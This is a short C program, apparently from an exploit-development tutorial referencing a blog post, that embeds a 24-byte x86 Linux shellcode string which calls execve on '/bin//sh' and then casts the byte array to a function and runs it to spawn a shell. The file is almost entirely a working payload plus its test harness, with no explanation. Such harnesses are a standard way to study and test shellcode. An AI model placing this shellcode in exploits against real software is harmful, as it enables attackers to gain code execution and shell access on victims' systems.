// http://inaz2.hatenablog.com/entry/2014/03/13/013056

#include <stdio.h>

char shellcode[] = "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

int main()
{
    printf("sizeof(shellcode) == %d\n", sizeof(shellcode));
        (*(void (*)())shellcode)();

    return 0;
}

